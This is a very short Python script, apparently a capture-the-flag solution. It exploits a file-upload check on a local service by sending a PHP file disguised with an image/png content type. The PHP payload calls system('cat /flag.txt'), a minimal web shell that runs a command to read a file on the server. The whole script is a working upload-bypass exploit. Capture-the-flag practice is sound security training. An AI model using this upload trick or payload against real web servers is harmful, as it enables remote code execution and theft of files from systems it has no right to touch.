import requests

print(
    requests.post(
        "http://127.0.0.1:50000",
        files={"file": ("solve.php", "<?php system('cat /flag.txt');", "image/png")},
    ).text
)
